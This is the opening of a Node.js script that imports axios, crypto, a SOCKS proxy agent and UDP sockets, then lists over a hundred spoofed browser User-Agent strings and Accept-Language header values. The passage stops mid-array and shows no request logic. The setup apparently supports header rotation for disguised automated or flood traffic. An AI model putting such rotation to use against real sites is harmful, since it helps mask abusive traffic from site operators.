const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const chalk = require('chalk');
const { SocksProxyAgent } = require('socks-proxy-agent');
const dgram = require('dgram');

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:97.0) Gecko/20100101 Firefox/97.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.88 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edge/98.0.1108.62',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10166',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; moto e5 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.52',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.2222.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 15; Mobile; rv:141.0) Gecko/141.0 Firefox/141.0',
    'Mozilla/5.0 (iPad; CPU OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/140.0.0.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/141.0',
    'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; OnePlus 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/140.0.0.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/125.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/5.0 (Windows; U; Windows NT 10.0; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Vivaldi/6.8',
    'Mozilla/5.0 (Linux; Android 15; SM-S938U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; motorola edge 40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Google Pixel Fold 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/140.0 Mobile/15E148 Firefox/140.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Apple M2; Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Mozilla/5.0 (Linux; Android 15; SM-A566B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; vivo 2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 19_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU iPadOS 19_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 19_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.2 Mobile/15E148 Safari/604.1'
];

const langHeader = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9",
    "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", 'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9',
    'en-AU,en;q=0.9', 'en-NZ,en;q=0.9', 'en-ZA,en;q=0.9', 'en-IE,en;q=0.9', 'en-IN,en;q=0.9', 'ar-SA,ar;q=0.9',
    'az-Latn-AZ,az;q=0.9', 'be-BY,be;q=0.9', 'bg-BG,bg;q=0.9', 'bn-IN,bn;q=0.9', 'ca-ES,ca;q=0.9', 'cs-CZ,cs;q=0.9',
    'cy-GB,cy;q=0.9', 'da-DK,da;q=0.9', 'de-DE,de;q=0.9', 'el-GR,el;q=0.9', 'es-ES,es;q=0.9', 'et-EE,et;q=0.9',
    'eu-ES,eu;q=0.9', 'fa-IR,fa;q=0.9', 'fi-FI,fi;q=0.9', 'fr-FR,fr;q=0.9', 'ga-IE,ga;q=0.9', 'gl-ES,gl;q=0.9',
    'gu-IN,gu;q=0.9', 'he-IL,he;q=0.9', 'hi-IN,hi;q=0.9', 'hr-HR,hr;q=0.9', 'hu-HU,hu;q=0.9', 'hy-AM,hy;q=0.9',
    'id-ID,id;q=0.9', 'is-IS,is;q=0.9', 'it-IT,it;q=0.9', 'ja-JP,ja;q=0.9', 'ka-GE,ka;q=0.9', 'kk-KZ,kk;q=0.9',
    'km-KH,km;q=0.9', 'kn-IN,kn;q=0.9', 'ko-KR,ko;q=0.9', 'ky-KG,ky;q=0.9', 'lo-LA,lo;q=0.9', 'lt-LT,lt;q=0.9',
    'lv-LV,lv;q=0.9', 'mk-MK,mk;q=0.9', 'ml-IN,ml;q=0.9', 'mn-MN,mn;q=0.9', 'mr-IN,mr;q=0.9', 'ms-MY,ms;q=0.9',
    'mt-MT,mt;q=0.9', 'my-MM,my;q=0.9', 'nb-NO,nb;q=0.9', 'ne-NP,ne;q=0.9', 'nl-NL,nl;q=0.9', 'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'pl-PL,pl;q=0.9', 'pt-BR,pt;q=0.9', 'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9', 'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9', 'sv-SE,sv;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9', 'uk-UA,uk;q=0.9', 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', 'vi-VN,vi;q=0.9', 'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9', 'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8', 'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', 'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8', 'bs-Latn-BA,bs;q=0.8', 'dz-BT,dz;q=0.8', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8', 'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8', 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8', 'is-IS,is;q=0.8', 'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8', 'kkj-CM,kkj;q=0.8', 'kl-GL,kl;q=0.8', 'km-KH,km;q=0.8', 'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8', 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', 'mua-CM,mua;q=0.8', 'nds-DE,nds;q=0.8', 'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', 'pa-Arab-PK,pa;q=0.8', 'ps-AF,ps;q=0.8', 'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8', 'quz-PE,quz;q=0.8', 'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8', 'si-LK,si;q=0.8', 'smn-FI,smn;q=0.8', 'sms-FI,sms;q=0.8', 'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8', 'ti-ER,ti;q=0.8', 'te;q=0.9,en-US;q=0.8,en;q=0.7', 'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8', 'tt-RU,tt;q=0.8', 'ug-CN,ug;q=0.8', 'uz-Cyrl-UZ,uz;q=0.8', 've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8', 'xh-ZA,xh;q=0.8', 'yo-NG,yo;q=0.8', 'zgh-MA,zgh;q=0.8', 'zu-ZA,zu;q=0.8',
    "en-US,en;q=0.9,de;q=0.8,fr;q=0.7,es;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3,zh;q=0.2,ja;q=0.1",
    "de-DE,de;q=0.95,en;q=0.9,fr;q=0.85,it;q=0.8,es;q=0.75,nl;q=0.7,pl;q=0.65,tr;q=0.6,ar;q=0.55",
    "fr-FR,fr;q=0.98,en;q=0.92,de;q=0.86,es;q=0.8,it;q=0.74,pt;q=0.68,ru;q=0.62,zh;q=0.56,ja;q=0.5",
    "es-ES,es;q=0.97,en;q=0.91,pt;q=0.85,fr;q=0.79,it;q=0.73,de;q=0.67,ca;q=0.61,gl;q=0.55,eu;q=0.49",
    "*,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3,zh;q=0.2,ja;q=0.1",
    "en-US,en;q=0.9,*;q=0.5",
    "*,fr;q=0.8,en;q=0.7,de;q=0.6,es;q=0.5,it;q=0.4,pt;q=0.3,ru;q=0.2,zh;q=0.1",
    "zh-CN,zh;q=0.9,zh-Hans;q=0.8,zh-Hant;q=0.7,en;q=0.6,ja;q=0.5,ko;q=0.4,ru;q=0.3",
    "zh-TW,zh;q=0.9,zh-Hant;q=0.85,zh-Hans;q=0.8,en;q=0.75,ja;q=0.7,ko;q=0.65",
    "pt-BR,pt;q=0.95,pt-BR;q=0.9,es;q=0.85,en;q=0.8,fr;q=0.75,it;q=0.7,de;q=0.65",
    "pt-PT,pt;q=0.95,pt-PT;q=0.9,es;q=0.85,en;q=0.8,fr;q=0.75,it;q=0.7,de;q=0.65",
    'haw-US,haw;q=0.9,en;q=0.8',
    'mi-NZ,mi;q=0.9,en;q=0.8',
    'gn-PY,gn;q=0.9,es;q=0.8,pt;q=0.7',
    'qu-PE,qu;q=0.9,es;q=0.8',
    'ay-BO,ay;q=0.9,es;q=0.8',
    'se-NO,se;q=0.9,no;q=0.8,en;q=0.7',
    'yi-US,yi;q=0.9,en;q=0.8,he;q=0.7',
    'fj-FJ,fj;q=0.9,en;q=0.8',
    'ty-PF,ty;q=0.9,fr;q=0.8',
    'mg-MG,mg;q=0.9,fr;q=0.8,en;q=0.7',
    "en-US,en;q=0.99,es;q=0.95,fr;q=0.9,de;q=0.85,it;q=0.8,pt;q=0.75,ru;q=0.7,zh;q=0.65,ja;q=0.6,ko;q=0.55,ar;q=0.5,hi;q=0.45",
    "de-DE,de;q=0.98,en;q=0.96,fr;q=0.94,it;q=0.92,es;q=0.9,pl;q=0.88,tr;q=0.86,ru;q=0.84,ar;q=0.82,zh;q=0.8,ja;q=0.78,ko;q=0.76",
    "fr-FR,fr;q=0.99,en;q=0.97,de;q=0.95,es;q=0.93,it;q=0.91,pt;q=0.89,ru;q=0.87,zh;q=0.85,ja;q=0.83,ar;q=0.81,hi;q=0.79,ko;q=0.77",
    "sr-Cyrl-RS,sr;q=0.9,sr-Latn;q=0.8,en;q=0.7,ru;q=0.6",
    "uz-Latn-UZ,uz;q=0.9,uz-Cyrl;q=0.8,ru;q=0.7,en;q=0.6",
    "zh-CN,zh-Hans;q=0.9,zh-Hant;q=0.8,en;q=0.7,ja;q=0.6,ko;q=0.5",
    "nl-NL,nl;q=0.9,en;q=0.8,de;q=0.7,fr;q=0.6,af;q=0.5",
    "sv-SE,sv;q=0.9,no;q=0.8,da;q=0.7,en;q=0.6,de;q=0.5",
    "pl-PL,pl;q=0.9,en;q=0.8,de;q=0.7,ru;q=0.6,uk;q=0.5,cs;q=0.4",
    "tr-TR,tr;q=0.9,en;q=0.8,de;q=0.7,fr;q=0.6,ar;q=0.5,ru;q=0.4",
    "sw-KE,sw;q=0.9,en;q=0.8,fr;q=0.7,ar;q=0.6,pt;q=0.5",
    "yo-NG,yo;q=0.9,en;q=0.8,fr;q=0.7,ar;q=0.6",
    "ha-NG,ha;q=0.9,en;q=0.8,fr;q=0.7,ar;q=0.6",
    "am-ET,am;q=0.9,en;q=0.8,ar;q=0.7,fr;q=0.6",
    "ar-SA,ar;q=0.9,en;q=0.8,fr;q=0.7,tr;q=0.6,fa;q=0.5,he;q=0.4",
    "he-IL,he;q=0.9,en;q=0.8,ar;q=0.7,ru;q=0.6,fr;q=0.5",
    "fa-IR,fa;q=0.9,en;q=0.8,ar;q=0.7,tr;q=0.6,ru;q=0.5",
    "th-TH,th;q=0.9,en;q=0.8,zh;q=0.7,ja;q=0.6,ko;q=0.5",
    "vi-VN,vi;q=0.9,en;q=0.8,zh;q=0.7,fr;q=0.6,ru;q=0.5",
    "id-ID,id;q=0.9,en;q=0.8,nl;q=0.7,zh;q=0.6,ja;q=0.5",
    "ms-MY,ms;q=0.9,en;q=0.8,zh;q=0.7,ta;q=0.6,hi;q=0.5",
    "hi-IN,hi;q=0.9,en;q=0.8,ta;q=0.7,te;q=0.6,kn;q=0.5,ml;q=0.4,ur;q=0.3,pa;q=0.2",
    "bn-IN,bn;q=0.9,en;q=0.8,hi;q=0.7,ur;q=0.6,ta;q=0.5",
    "ta-IN,ta;q=0.9,en;q=0.8,hi;q=0.7,ml;q=0.6,te;q=0.5",
    "te-IN,te;q=0.9,en;q=0.8,hi;q=0.7,ta;q=0.6,kn;q=0.5",
    "en-US,en;q=1.0,fr;q=0.95,de;q=0.9,es;q=0.85,it;q=0.8,pt;q=0.75,ru;q=0.7,zh;q=0.65,ja;q=0.6",
    "en-US,en;q=0.99,fr;q=0.88,de;q=0.77,es;q=0.66,it;q=0.55,pt;q=0.44,ru;q=0.33,zh;q=0.22,ja;q=0.11",
    "en-US,en;q=0.999,fr;q=0.888,de;q=0.777,es;q=0.666,it;q=0.555,pt;q=0.444,ru;q=0.333,zh;q=0.222,ja;q=0.111",
    "en-US,en,fr,de,es,it,pt,ru,zh,ja",
    "de-DE,de,en,fr,it,es,nl,pl,tr",
    "fr-FR,fr,en,de,es,it,pt,ru",
    "en",
    "fr",
    "de",
    "es",
    "it",
    "pt",
    "ru",
    "zh",
    "ja",
    "ko",
    "ar",
    "hi",
    "en-US, en; q=0.9, de; q=0.8, fr; q=0.7, es; q=0.6, it; q=0.5",
    "de-DE, de; q=0.9, en; q=0.8, fr; q=0.7, it; q=0.6, es; q=0.5",
    "fr-FR, fr; q=0.9, en; q=0.8, de; q=0.7, es; q=0.6, it; q=0.5",
    "ca-ES,ca;q=0.9,es;q=0.8,en;q=0.7,fr;q=0.6,pt;q=0.5",
    "eu-ES,eu;q=0.9,es;q=0.8,fr;q=0.7,en;q=0.6,pt;q=0.5",
    "gl-ES,gl;q=0.9,es;q=0.8,pt;q=0.7,en;q=0.6,fr;q=0.5",
    "lv-LV,lv;q=0.9,ru;q=0.8,en;q=0.7,lt;q=0.6,et;q=0.5",
    "lt-LT,lt;q=0.9,ru;q=0.8,en;q=0.7,lv;q=0.6,pl;q=0.5",
    "et-EE,et;q=0.9,ru;q=0.8,en;q=0.7,fi;q=0.6,lv;q=0.5",
    "hr-HR,hr;q=0.9,en;q=0.8,de;q=0.7,it;q=0.6,hu;q=0.5",
    "sr-RS,sr;q=0.9,en;q=0.8,ru;q=0.7,de;q=0.6,fr;q=0.5",
    "sl-SI,sl;q=0.9,en;q=0.8,de;q=0.7,it;q=0.6,hr;q=0.5",
